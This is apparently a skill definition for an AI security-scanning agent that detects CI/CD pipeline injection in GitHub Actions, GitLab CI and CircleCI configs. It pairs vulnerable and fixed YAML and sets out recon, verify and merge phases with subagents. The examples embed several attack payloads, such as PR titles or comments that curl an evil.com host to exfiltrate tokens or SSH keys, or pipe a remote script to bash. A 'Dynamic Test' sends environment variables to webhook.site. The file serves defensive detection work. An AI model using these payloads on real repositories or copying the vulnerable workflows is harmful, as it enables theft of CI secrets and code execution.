---
name: sast-pipelineinj
description: >-
  Detect CI/CD pipeline injection vulnerabilities where untrusted event payload values
  (pull request titles, issue bodies, comment bodies, branch names) are interpolated
  directly into a `run:` shell step or `actions/github-script` via `${{ ... }}` expression
  syntax, letting an external contributor inject arbitrary shell commands into the CI runner.
  Uses a three-phase approach: recon (find all injection sinks across GitHub Actions, GitLab CI,
  and CircleCI configs), batched verify (parallel subagents, 3 candidates each, determine
  trigger reachability and FP patterns), and merge (consolidate into `sast/pipelineinj-results.md`
  and `sast/pipelineinj-results.json`). Runs on every repository with CI configuration files
  (always-on skill). Covers CWE-94 / OWASP A03 / GitHub Actions expression injection.
version: 0.1.0
---

# CI/CD Pipeline Injection Detection

You are performing a focused security assessment to find cases where untrusted external values — pull request titles, issue bodies, comment bodies, branch names, or pipeline trigger parameters — are interpolated directly into shell commands inside CI/CD workflow steps. This skill uses a three-phase approach with subagents: **recon** (find every workflow step where a user-controlled value lands inside a `run:` block or equivalent), **batched verify** (determine whether each injection site is reachable by external contributors, in parallel batches of 3), and **merge** (consolidate batch reports into `sast/pipelineinj-results.md` and `sast/pipelineinj-results.json`).

This skill is **always-on**: it runs on every repository that contains CI configuration files, regardless of the stack detected by the router.

---

## What is CI/CD Pipeline Injection

CI/CD pipeline injection is the workflow equivalent of command injection or XSS: a value that originates from an untrusted external party (a pull request author, an issue commenter, an API caller) is embedded unescaped into a shell command that the CI runner executes with full access to repository secrets, deployment keys, and cloud credentials.

The canonical attack vector (GitHub Actions):

```yaml
# VULNERABLE — PR title injected directly into a run: step
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR info
        run: echo "Building PR: ${{ github.event.pull_request.title }}"
```

An attacker opens a PR titled:
```
foo"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo "
```

The runner expands `${{ github.event.pull_request.title }}` at **YAML parse time**, before the shell sees it, producing:

```bash
echo "Building PR: foo"; curl https://evil.example.com/exfil?token=$GITHUB_TOKEN; echo ""
```

The injected `curl` command runs with full access to `$GITHUB_TOKEN` (and any other secrets injected by the workflow). The attacker can exfiltrate tokens, push commits, trigger deployments, or pivot to cloud infrastructure.

The critical distinction: `${{ ... }}` expression interpolation happens at the **Actions template engine** level, before the shell parses the command. This is fundamentally different from referencing an environment variable like `$MY_VAR` — environment variables are handled by the shell and are safe from injection. The YAML `run:` block that contains `${{ github.event.* }}` inline is the sink.

### What Pipeline Injection IS

- `${{ github.event.pull_request.title }}` inside a `run:` block, in a workflow triggered by `pull_request`, `pull_request_review_comment`, `issue_comment`, or `pull_request_target` without a required approval gate
- `${{ github.event.issue.body }}` inside `run:` or inside a `actions/github-script` `script:` block
- `${{ github.event.comment.body }}` in any `on: issue_comment` or `on: pull_request_review_comment` workflow
- `${{ github.head_ref }}` inside `run:` — branch names are attacker-controlled and can contain shell metacharacters
- `${{ github.event.inputs.* }}` when the workflow is triggered via `workflow_dispatch` from an untrusted caller (less common, but possible with `pull_request` chaining)
- `${{ github.event.pull_request.body }}` — PR description is attacker-controlled
- `${{ github.event.review.body }}` — review comment body is attacker-controlled
- `${{ github.event.pull_request.head.label }}` — format is `user:branch-name`, both attacker-controlled
- `${{ github.event.pull_request.head.repo.full_name }}` — attacker-controlled fork name
- GitLab CI `script:` steps interpolating `$CI_COMMIT_REF_NAME` (branch name), `$CI_MERGE_REQUEST_TITLE`, or custom trigger variables from API-triggered pipelines without input sanitization
- CircleCI pipeline parameter values from API triggers used in a `run:` step without sanitization: `<< pipeline.parameters.user_input >>`
- `actions/github-script` with `script: console.log('${{ github.event.pull_request.title }}')` — JavaScript is also injectable via template expansion

### What Pipeline Injection is NOT

Do not flag these patterns:

- **Safe trusted-context values**: `${{ github.sha }}`, `${{ github.run_id }}`, `${{ github.repository }}`, `${{ github.ref }}` (when the ref is a full SHA), `${{ github.actor }}` — these values are controlled by GitHub infrastructure, not by PR authors. Note: `github.ref` on `pull_request` events contains the merge ref (`refs/pull/N/merge`), which is safe; `github.head_ref` is the branch name and IS attacker-controlled.
- **Environment variable pass-through (primary safe pattern)**: Values assigned to an environment variable in the `env:` block and then referenced as `$ENV_VAR` in the shell — the shell expands `$ENV_VAR` as a variable, not as a code fragment. The injection risk is gone because the value is never embedded into the shell script text.
  ```yaml
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $PR_TITLE"   # SAFE — shell variable, not template injection
  ```
- **`pull_request_target` with required environment approval**: A workflow on `pull_request_target` that gates job execution on an environment requiring manual approval (`environment: protected-env`) — an untrusted fork cannot run the job without reviewer approval. Only flag if the environment approval gate is absent or if the trigger is `pull_request` (not `pull_request_target`).
- **Interpolation into non-shell steps** (`with:` inputs to a third-party action): When `${{ github.event.pull_request.title }}` appears only inside a `with:` block for an action (not a `run:` step), whether it is safe depends entirely on how that action handles the input. Do not flag unless there is clear evidence the action passes the value to a shell `eval`-equivalent. When in doubt, note it as "Needs Manual Review" rather than flagging it as Vulnerable.
- **Protected branch push-only workflows**: A workflow triggered exclusively by `push` to a protected branch (e.g., `on: push: branches: [main]`) — external contributors cannot push to protected branches, so all payload values originate from trusted committers.
- **Hardcoded or env-var values from secrets**: `${{ secrets.SOME_VALUE }}` — secrets are repository-controlled, not attacker-controlled.
- **`toJSON()` wrapping**: `${{ toJSON(github.event.pull_request.title) }}` used carefully can reduce injection risk (the value is JSON-encoded), but it does **not** fully eliminate it if the JSON is passed to a shell `eval`. Only mark as Not Vulnerable if the `toJSON()` output is demonstrably safe in context.

### Patterns That Prevent Pipeline Injection

**1. Environment variable pass-through (recommended — GitHub's own guidance)**

```yaml
# SAFE: value is set as an env var, referenced via shell variable
- name: Print PR info
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
    HEAD_REF: ${{ github.head_ref }}
  run: |
    echo "PR title: $PR_TITLE"
    echo "Branch: $HEAD_REF"
```

The `env:` block assigns the value; the shell sees `$PR_TITLE` as a normal variable expansion, not as shell code. The injection path is closed.

**2. `pull_request_target` with required environment approval**

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    environment: protected  # ← requires reviewer approval — untrusted forks blocked
    steps:
      - run: echo "${{ github.event.pull_request.title }}"
```

Annotation: even with the approval gate, the `${{ }}` inline in `run:` is still bad practice — the safe pattern is still to pass via env var. Flag as "Likely Vulnerable" rather than "Vulnerable" only when the approval gate is definitively in place.

**3. Push-only trigger on protected branch**

```yaml
on:
  push:
    branches: [main, release/**]
# No pull_request, issue_comment, or pull_request_review_comment triggers
```

External contributors cannot push to `main`. Workflow values originate from trusted committers. Not vulnerable to pipeline injection from external attackers (privilege escalation by a malicious maintainer is out of scope for this skill).

**4. GitLab CI — quoting and validation**

```yaml
# SAFER (GitLab): always quote CI variable references in shell
script:
  - echo "${CI_COMMIT_REF_NAME}"  # double-quoting reduces shell word-splitting
  # But still vulnerable to injection if CI_COMMIT_REF_NAME contains $(...) or backticks
  # The truly safe approach is to validate the branch name format before use:
  - echo "${CI_COMMIT_REF_NAME}" | grep -E '^[a-zA-Z0-9/_.-]+$' || exit 1
```

---

## Vulnerable vs. Secure Examples

### GitHub Actions — Direct Injection (Critical, Most Common)

```yaml
# VULNERABLE: PR title injected into run: step
# Trigger: pull_request (external contributors can open PRs)
name: CI
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR title
        run: echo "Building PR: ${{ github.event.pull_request.title }}"
        # Attack: title = 'x"; curl https://evil.com/exfil?t=$GITHUB_TOKEN; echo "'
        # Result: attacker exfiltrates GITHUB_TOKEN

      - name: Label check
        run: |
          echo "Branch: ${{ github.head_ref }}"
          git checkout ${{ github.head_ref }}
          # Attack: head_ref = 'main; curl https://evil.com/$(cat /etc/passwd | base64)'

      - name: Validate PR body
        run: |
          BODY="${{ github.event.pull_request.body }}"
          echo "PR body: $BODY"
          # Attack: body = '"; $(curl -s https://evil.com/payload | bash); echo "'
```

```yaml
# SECURE: all three fixed with env var pass-through
name: CI
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Echo PR title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Building PR: $PR_TITLE"

      - name: Label check
        env:
          HEAD_REF: ${{ github.head_ref }}
        run: |
          echo "Branch: $HEAD_REF"
          git checkout "$HEAD_REF"   # quoted, shell variable — safe

      - name: Validate PR body
        env:
          PR_BODY: ${{ github.event.pull_request.body }}
        run: |
          echo "PR body: $PR_BODY"
```

### GitHub Actions — Issue Comment Trigger (Critical)

```yaml
# VULNERABLE: issue_comment trigger with comment body in run:
on:
  issue_comment:
    types: [created]

jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - name: Log comment
        run: echo "Comment: ${{ github.event.comment.body }}"
        # Attacker posts: "; curl https://evil.com/exfil?s=$(cat ~/.ssh/id_rsa | base64); echo "

      - name: Run command from comment
        if: startsWith(github.event.comment.body, '/run')
        run: |
          CMD="${{ github.event.comment.body }}"
          # Catastrophically dangerous: executing attacker-supplied string
          bash -c "$CMD"
```

```yaml
# SECURE: comment body via env var; never execute it
on:
  issue_comment:
    types: [created]

jobs:
  respond:
    runs-on: ubuntu-latest
    steps:
      - name: Log comment
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: echo "Comment: $COMMENT_BODY"

      - name: Parse command from comment
        env:
          COMMENT_BODY: ${{ github.event.comment.body }}
        run: |
          # Safe: parse via env var, validate against allowlist
          if [[ "$COMMENT_BODY" == "/run tests" ]]; then
            echo "Running tests..."
          elif [[ "$COMMENT_BODY" == "/deploy staging" ]]; then
            echo "Deploying to staging..."
          else
            echo "Unknown command"
          fi
```

### GitHub Actions — actions/github-script Injection

```yaml
# VULNERABLE: github-script with ${{ }} interpolation in script body
- uses: actions/github-script@v7
  with:
    script: |
      const title = '${{ github.event.pull_request.title }}';
      // Attack: title = "'; require('child_process').execSync('curl ...'); //"
      console.log(`PR: ${title}`);

# VULNERABLE: constructing a shell command string dynamically in github-script
- uses: actions/github-script@v7
  with:
    script: |
      const { execSync } = require('child_process');
      execSync(`echo "${{ github.event.pull_request.title }}"`);
```

```yaml
# SECURE: use context object directly in github-script — no ${{ }} needed
- uses: actions/github-script@v7
  with:
    script: |
      // context.payload is the raw GitHub event payload — safe, no shell injection
      const title = context.payload.pull_request.title;
      console.log(`PR: ${title}`);

# SECURE: if you must pass via env, use the env: block approach
- uses: actions/github-script@v7
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  with:
    script: |
      const title = process.env.PR_TITLE;
      console.log(`PR: ${title}`);
```

### GitHub Actions — pull_request_target (High Risk Pattern)

```yaml
# VULNERABLE: pull_request_target without environment approval gate
# pull_request_target runs in the context of the BASE repo (has access to secrets)
# and can be triggered by untrusted forks
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    # No "environment:" key — no approval gate
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checking out untrusted code
      - run: |
          echo "PR from: ${{ github.event.pull_request.head.label }}"
          # head.label = "attacker-user:main; curl https://evil.com/exfil?t=$GITHUB_TOKEN"
```

```yaml
# SAFER: pull_request_target with environment gate (still use env var for value)
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    environment: external-prs   # ← requires manual approval for untrusted forks
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Echo PR info
        env:
          HEAD_LABEL: ${{ github.event.pull_request.head.label }}
        run: echo "PR from: $HEAD_LABEL"
```

### GitLab CI — Branch Name Injection

```yaml
# VULNERABLE (.gitlab-ci.yml): branch name in script step
build:
  script:
    - echo "Building branch $CI_COMMIT_REF_NAME"
    - git tag $CI_COMMIT_REF_NAME   # if branch = "main; curl evil.com/exfil | bash"
    - docker build -t myapp:$CI_COMMIT_REF_NAME .

# Also vulnerable: merge request title from API trigger
deploy:
  variables:
    MR_TITLE: $CI_MERGE_REQUEST_TITLE
  script:
    - echo "Deploying: $MR_TITLE"    # branch-name injection via shell word splitting
    - notify.sh "$MR_TITLE"          # if MR_TITLE contains shell metacharacters
```

```yaml
# SECURE (.gitlab-ci.yml): validate branch name before use; quote all variable references
build:
  script:
    - |
      # Validate branch name format — reject anything that isn't slug-safe
      echo "${CI_COMMIT_REF_NAME}" | grep -qE '^[a-zA-Z0-9][a-zA-Z0-9/_.-]*$' || {
        echo "ERROR: Invalid branch name: ${CI_COMMIT_REF_NAME}"
        exit 1
      }
      echo "Building branch ${CI_COMMIT_REF_NAME}"
      docker build -t "myapp:${CI_COMMIT_REF_SLUG}" .   # CI_COMMIT_REF_SLUG is pre-slugified
```

### CircleCI — Pipeline Parameter Injection

```yaml
# VULNERABLE (config.yml): pipeline parameter from API trigger used in run step
parameters:
  deploy_target:
    type: string
    default: ""

jobs:
  deploy:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Deploy
          command: |
            TARGET="<< pipeline.parameters.deploy_target >>"
            # Attack via API: deploy_target = "staging; curl evil.com/exfil | bash"
            echo "Deploying to $TARGET"
            ./deploy.sh $TARGET    # unquoted — word-splitting and injection

# SECURE: validate pipeline parameter before use
jobs:
  deploy:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Validate and Deploy
          command: |
            TARGET="<< pipeline.parameters.deploy_target >>"
            # Validate against allowlist before use
            case "$TARGET" in
              staging|production|preview)
                echo "Deploying to $TARGET"
                ./deploy.sh "$TARGET"   # quoted — word-splitting prevented
                ;;
              *)
                echo "ERROR: Unknown deploy target: $TARGET"
                exit 1
                ;;
            esac
```

---

## Execution

This skill runs in three phases using subagents. This skill does NOT require `sast/architecture.md` — it is self-contained and operates on CI configuration files only. However, if `sast/architecture.md` exists, pass it to subagents as supplemental context.

### Phase 1: Recon — Find Pipeline Injection Candidates

Launch a subagent with the following instructions:

> **Goal**: Find every CI/CD workflow step where a user-controlled value is interpolated via template syntax directly into a shell command. Write results to `sast/pipelineinj-recon.md`.
>
> **Scope**: Search the following file paths. If a path does not exist, skip it.
>
> - `.github/workflows/*.yml` and `.github/workflows/*.yaml` — GitHub Actions
> - `.gitlab-ci.yml` and `.gitlab-ci/*.yml` — GitLab CI
> - `.circleci/config.yml` — CircleCI
> - `azure-pipelines.yml` and `azure-pipelines/*.yml` — Azure Pipelines (bonus coverage)
> - `Jenkinsfile` and `jenkins/*.groovy` — Jenkins pipelines (bonus coverage)
>
> **GitHub Actions — what to search for**:
>
> The core pattern is a `${{ ... }}` expression containing one of the following untrusted-source prefixes, appearing INSIDE a `run:` block or inside a `script:` value of an `actions/github-script` step. Search for ALL occurrences of these expressions anywhere in workflow files, then filter to those that appear within `run:` context (either on the same `run:` line or within a multi-line `run: |` block).
>
> Untrusted source expressions to flag:
> - `${{ github.event.pull_request.title }}`
> - `${{ github.event.pull_request.body }}`
> - `${{ github.event.pull_request.head.label }}`
> - `${{ github.event.pull_request.head.ref }}`
> - `${{ github.event.pull_request.head.repo.full_name }}`
> - `${{ github.event.issue.title }}`
> - `${{ github.event.issue.body }}`
> - `${{ github.event.comment.body }}`
> - `${{ github.event.review.body }}`
> - `${{ github.event.review_comment.body }}`
> - `${{ github.event.discussion.body }}`
> - `${{ github.head_ref }}` — the PR source branch name (attacker-controlled)
> - `${{ github.event.inputs.* }}` — workflow_dispatch inputs when passed to `run:`
> - Any `${{ github.event.* }}` expression not covered by the trusted list below
>
> Trusted expressions — do NOT flag:
> - `${{ github.sha }}`, `${{ github.run_id }}`, `${{ github.run_number }}`
> - `${{ github.repository }}`, `${{ github.repository_owner }}`
> - `${{ github.ref }}` (when the workflow does NOT trigger on pull_request — on push to protected branch, `ref` is infrastructure-controlled)
> - `${{ github.actor }}` (username of the person who triggered the workflow — can be spoofed in some contexts but is not a direct injection vector for shell)
> - `${{ secrets.* }}` — secrets are repository-controlled
> - `${{ env.* }}` — environment variables set earlier in the workflow
> - `${{ steps.*.outputs.* }}` — step outputs from earlier steps
> - `${{ needs.*.outputs.* }}` — job outputs
>
> **Workflow trigger analysis**: For each candidate, also record the workflow's `on:` trigger block. The risk level depends on who can trigger the workflow:
>
> | Trigger | External contributor can trigger? |
> |---|---|
> | `pull_request` | YES — anyone who can fork the repo |
> | `pull_request_target` | YES — unless gated by a required environment approval |
> | `issue_comment` | YES — anyone who can comment (often public) |
> | `pull_request_review_comment` | YES — anyone who can review |
> | `discussion_comment` | YES — in public repos |
> | `push` to protected branch | NO — only trusted committers |
> | `workflow_dispatch` | Only if exposed via API — check if caller is trusted |
>
> **Environment variable pass-through — primary FP pattern**: Check whether the flagged expression appears in an `env:` block RATHER THAN inline in the `run:` command text. If the pattern is:
> ```yaml
> env:
>   MY_VAR: ${{ github.event.pull_request.title }}
> run: echo "$MY_VAR"
> ```
> The `${{ }}` is in the `env:` block, and the `run:` uses `$MY_VAR` (shell variable). This is the **safe pattern** — do NOT flag it as a candidate. Only flag when `${{ github.event.* }}` appears literally inside the `run:` command text itself or inside the `script:` text of `actions/github-script`.
>
> **GitLab CI — what to search for**:
>
> - `script:` steps that reference `$CI_COMMIT_REF_NAME`, `$CI_MERGE_REQUEST_TITLE`, `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, or any custom trigger variable passed from the API without sanitization
> - Look for unquoted variable references (e.g., `echo $CI_COMMIT_REF_NAME` without quotes) which are susceptible to word-splitting injection
> - Look for variable values being passed to `eval`, `bash -c`, or `sh -c`
>
> **CircleCI — what to search for**:
>
> - `<< pipeline.parameters.* >>` values appearing in `command:` text of `run:` steps
> - Custom pipeline parameters of type `string` that accept values from API triggers and are embedded in shell commands without validation
>
> **What to record for each candidate**:
>
> For every injection candidate found:
> - The file path and line number(s)
> - The workflow name and job name
> - The step name
> - The exact expression being interpolated (e.g., `${{ github.event.pull_request.title }}`)
> - The full `run:` block content (or the relevant portion)
> - The workflow trigger(s) from the `on:` block
> - Whether the workflow has any `environment:` key that might gate execution
> - Whether the expression is in `env:` (safe) or inline in `run:` (vulnerable)
>
> **Output format** — write to `sast/pipelineinj-recon.md`:
>
> ```markdown
> # Pipeline Injection Recon: [Project Name]
>
> ## Summary
> Found [N] pipeline injection candidates across [M] CI configuration files.
>
> CI files scanned:
> - `.github/workflows/ci.yml` (GitHub Actions)
> - `.gitlab-ci.yml` (GitLab CI)
> - [etc.]
>
> ## Injection Candidates
>
> ### 1. [Descriptive name — e.g., "PR title in build workflow run: step"]
> - **File**: `.github/workflows/ci.yml` (line 42)
> - **Workflow**: CI
> - **Job**: build
> - **Step**: Print PR info
> - **Trigger(s)**: `pull_request`
> - **Injected expression**: `${{ github.event.pull_request.title }}`
> - **Injection context**: inline in `run:` block (NOT env: block)
> - **Environment gate**: None
> - **Run block**:
>   ```
>   run: echo "PR title: ${{ github.event.pull_request.title }}"
>   ```
> - **Note**: [any additional context]
>
> [Repeat for each candidate]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `sast/pipelineinj-recon.md`. If the recon found **zero injection candidates** (the summary reports "Found 0" or the "Injection Candidates" section is empty), **skip Phase 2 entirely**. Instead, write the following content to both output files and stop:

```markdown
# Pipeline Injection Analysis Results

No vulnerabilities found.
```

```json
{
  "findings": []
}
```

Write the markdown to `sast/pipelineinj-results.md` and the JSON to `sast/pipelineinj-results.json`. Then delete `sast/pipelineinj-recon.md`.

Only proceed to Phase 2 if Phase 1 found at least one candidate.

### Phase 2: Verify — Reachability and Impact Analysis (Batched)

After Phase 1 completes, read `sast/pipelineinj-recon.md` and split the injection candidates into **batches of up to 3 candidates each**. Launch **one subagent per batch in parallel**. Each subagent determines the true risk of its assigned candidates and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `sast/pipelineinj-recon.md` and count the numbered candidate sections under "Injection Candidates" (### 1., ### 2., etc.).
2. Divide into batches of up to 3. For example, 8 candidates → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those candidate sections.
4. Launch all batch subagents **in parallel**, each receiving only its assigned candidates' text.
5. Each subagent writes to `sast/pipelineinj-batch-N.md` where N is the 1-based batch number.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned pipeline injection candidate, determine the true risk level (Vulnerable, Likely Vulnerable, Not Vulnerable, or Needs Manual Review) and write the full analysis to `sast/pipelineinj-batch-[N].md`.
>
> **Your assigned candidates** (from the recon phase):
>
> [Paste the full text of the assigned candidate sections here, preserving original numbering]
>
> **Context**: If `sast/architecture.md` exists in the project, read it for supplemental context about the project's purpose and CI setup.
>
> **Verify questions — answer these in order for each candidate**:
>
> **Question 1: Is the expression in an `env:` block or inline in `run:`?**
>
> The recon phase should have recorded this, but verify it by reading the actual workflow file.
>
> - If the `${{ github.event.* }}` expression appears in an `env:` block (assigning a value to an environment variable), AND the `run:` command references that variable as `$ENV_VAR` or `${ENV_VAR}` (shell variable syntax), the injection path is CLOSED. Mark as **Not Vulnerable** (safe env-var pass-through pattern).
> - If the `${{ }}` appears literally inside the text of a `run:` block (whether single-line or multi-line `run: |`), the injection path is OPEN. Proceed to Question 2.
> - Edge case: if the expression is in `env:` but the `run:` block also uses `eval "$ENV_VAR"` or `bash -c "$ENV_VAR"`, the safe pattern is negated — mark as **Vulnerable**.
>
> **Question 2: Can external contributors trigger this workflow?**
>
> Read the `on:` trigger block from the workflow file.
>
> - `pull_request` (any type) → external contributors (forkers) CAN trigger → `exploitability: reachable`
> - `issue_comment` → anyone who can comment CAN trigger (in most repos, any authenticated GitHub user) → `exploitability: reachable`
> - `pull_request_review_comment` → anyone who can submit a review CAN trigger → `exploitability: reachable`
> - `pull_request_target` → check for `environment:` in the job definition:
>   - If there IS a `environment: <name>` key in the job and that environment has protection rules requiring approval → `exploitability: conditional`
>   - If there is NO `environment:` key → `exploitability: reachable` (the workflow runs in the base repo context with secrets, for any fork's PR)
> - `push` to a protected branch → only trusted committers can trigger → `exploitability: unreachable` for external attackers
> - `workflow_dispatch` → check if the workflow is callable via `workflow_dispatch` from an untrusted caller; usually `exploitability: conditional`
>
> **Question 3: What secrets or sensitive resources does the workflow have access to?**
>
> Read the full workflow file to determine:
> - Does the workflow use `${{ secrets.* }}`? If yes, list which secrets (e.g., `GITHUB_TOKEN`, `AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, `DOCKER_PASSWORD`).
> - Does the workflow use `${{ github.token }}`? The `GITHUB_TOKEN` is always available and allows repo write access.
> - Does the workflow deploy to any cloud environment (AWS, GCP, Azure)? Check for cloud credential secrets.
> - Does the workflow publish to package registries (npm, PyPI, Docker Hub)?
>
> If the workflow has access to `GITHUB_TOKEN` (always present), secrets, or cloud credentials → severity is **critical** (arbitrary command execution with access to sensitive secrets).
>
> If the workflow demonstrably has no secret access (no `secrets:` references, `permissions: {}` or `permissions: read-all`, no deployment steps) → severity is **high** (RCE on the runner, but limited blast radius).
>
> **Question 4: Is there a `if:` condition that limits when the injected step runs?**
>
> Some workflows guard the vulnerable step with an `if:` condition:
> ```yaml
> - name: Deploy
>   if: github.event.pull_request.merged == true
>   run: echo "${{ github.event.pull_request.title }}"
> ```
> A merged PR title is still attacker-controlled (the PR was merged). Do NOT treat `if:` conditions as eliminating the vulnerability unless the condition requires a trusted actor (e.g., `if: github.actor == 'dependabot[bot]'` — this is organization-controlled).
>
> A condition like `if: contains(github.event.issue.labels.*.name, 'approved')` is NOT safe — labels can be added by anyone with triage permission.
>
> **FP-killers (patterns that confirm Not Vulnerable)**:
>
> 1. The `${{ github.event.* }}` expression is in `env:` and the `run:` block uses `$VAR_NAME` shell syntax — the safe pattern (see Question 1 above).
> 2. The workflow only triggers on `push` to a branch listed under `branches:` where all listed branches are protected (no `pull_request` trigger, no `issue_comment` trigger).
> 3. The expression is `${{ github.head_ref }}` but it is only used inside a `with:` input to a non-shell action (e.g., `actions/checkout@v4 with: ref: ${{ github.head_ref }}`), NOT in a `run:` block.
> 4. Dead workflow: the workflow file exists but is disabled (`workflow:` block has `on: {}` or no valid trigger).
> 5. `pull_request_target` WITH a confirmed required environment approval gate (`environment: name` where the named environment has branch protection / required reviewers configured).
>
> **exploitability / confidence rules**:
>
> - `exploitability: reachable` — expression is inline in `run:`, workflow triggered by `pull_request`, `issue_comment`, or similar open trigger
> - `exploitability: conditional` — injection is inline in `run:` but gated by `pull_request_target` with an approval environment, or `workflow_dispatch` without obvious public API exposure
> - `exploitability: unreachable` — confirmed `push`-only to protected branch, or expression provably in `env:` only
> - `confidence: high` — `${{ github.event.pull_request.title }}` (or similar) appears literally inside `run:` text with a `pull_request` trigger
> - `confidence: medium` — injection path is present but the trigger requires specific conditions (e.g., a label being applied), or the expression is in a composite action where the full call path requires tracing
> - `confidence: low` — the file structure suggests injection is possible but the full workflow YAML cannot be fully parsed (e.g., uses a reusable workflow)
>
> **chain_id rules**:
>
> - If the workflow has access to `GITHUB_TOKEN`, deployment secrets, or cloud credentials: `chain_id: "pipeline-secret-exfil"` — the injected command can exfiltrate secrets directly
> - If the workflow has no sensitive secret access: `chain_id: null`
>
> **Output format** — write to `sast/pipelineinj-batch-[N].md`:
>
> ```markdown
> # Pipeline Injection Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `.github/workflows/ci.yml` (line 42)
> - **Workflow**: CI / Job: build / Step: Print PR info
> - **Trigger**: `on: pull_request` (external contributors can trigger)
> - **Injected expression**: `${{ github.event.pull_request.title }}`
> - **Injection context**: inline in `run:` block — NOT passed via env var
> - **Secrets exposed**: `GITHUB_TOKEN` (always present), `AWS_ACCESS_KEY_ID`, `DOCKER_PASSWORD`
> - **Attack scenario**: An attacker opens a PR titled `x"; curl https://evil.com/exfil?t=$GITHUB_TOKEN; echo "` — the runner executes the injected curl command and exfiltrates the GitHub token and any other available secrets.
> - **Severity**: critical
> - **exploitability**: reachable
> - **confidence**: high
> - **chain_id**: "pipeline-secret-exfil"
> - **Remediation**: Move the value to an `env:` block and reference it as a shell variable in the `run:` step. Replace: `run: echo "${{ github.event.pull_request.title }}"` with: `env:\n  PR_TITLE: ${{ github.event.pull_request.title }}\nrun: echo "$PR_TITLE"`. Apply this pattern to all `${{ github.event.* }}` values used in `run:` steps.
> - **Dynamic Test**: Open a pull request against the repository with the title `test"; env | curl -d @- https://webhook.site/YOUR_ID; echo "` and observe the CI runner logs. A vulnerable runner will attempt the outbound curl; a patched runner will print the literal string.
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `.github/workflows/deploy.yml` (line 88)
> - **Workflow**: Deploy / Job: release / Step: Tag build
> - **Trigger**: `on: pull_request_target` with `environment: external-prs`
> - **Injected expression**: `${{ github.event.pull_request.head.label }}`
> - **Injection context**: inline in `run:` block
> - **Secrets exposed**: `GITHUB_TOKEN`, `NPM_TOKEN`
> - **Environment gate**: `environment: external-prs` present — manual approval may be required, but gate configuration was not confirmed from the workflow YAML alone
> - **Severity**: high
> - **exploitability**: conditional
> - **confidence**: medium
> - **chain_id**: "pipeline-secret-exfil"
> - **Concern**: If the `external-prs` environment has required reviewers configured in GitHub's environment settings, the risk is mitigated for fully external forks. However, the inline `${{ }}` in `run:` is still bad practice — a misconfigured environment (no required reviewers) or a reviewer who approves without inspecting the branch name would expose the runner to injection.
> - **Remediation**: Apply the env-var pass-through pattern regardless of the environment gate. The environment gate should be defense-in-depth, not the primary control.
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `.github/workflows/release.yml` (line 15)
> - **Reason**: `${{ github.head_ref }}` appears in an `env:` block and is referenced as `$HEAD_REF` in the `run:` step. The shell never sees the raw `${{ }}` expression. This is the correct safe pattern.
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `.github/workflows/composite.yml` (line 30)
> - **Uncertainty**: The workflow calls a reusable workflow (`uses: ./.github/workflows/shared-build.yml`) and passes `${{ github.event.pull_request.title }}` as an input. Whether the shared workflow uses it in a `run:` step cannot be determined without reading the shared workflow file, which was not found at that path.
> - **Suggestion**: Read `.github/workflows/shared-build.yml` and search for where the `title` input is used. If it appears in a `run:` block inside the shared workflow, the parent call is vulnerable.
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `sast/pipelineinj-batch-*.md` file and merge them into both `sast/pipelineinj-results.md` (human-readable) and `sast/pipelineinj-results.json` (machine-readable). You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `sast/pipelineinj-batch-1.md`, `sast/pipelineinj-batch-2.md`, ... files.
2. Collect all findings from each batch file and combine into one list, preserving classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Assign a sequential numeric ID to each finding: `pipelineinj-1`, `pipelineinj-2`, etc. Order: Vulnerable first, then Likely Vulnerable, then Needs Manual Review, then Not Vulnerable.
5. Write the merged markdown report to `sast/pipelineinj-results.md`:

```markdown
# CI/CD Pipeline Injection Analysis Results: [Project Name]

## Executive Summary
- Candidates analyzed: [total from recon]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## CI Files Scanned
- [list of CI config files found and scanned]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

6. Write the machine-readable JSON to `sast/pipelineinj-results.json` using the canonical schema. Emit one JSON object per Vulnerable, Likely Vulnerable, and Needs Manual Review finding. Not Vulnerable findings are omitted (true negatives):

```json
{
  "findings": [
    {
      "id": "pipelineinj-1",
      "skill": "sast-pipelineinj",
      "severity": "critical",
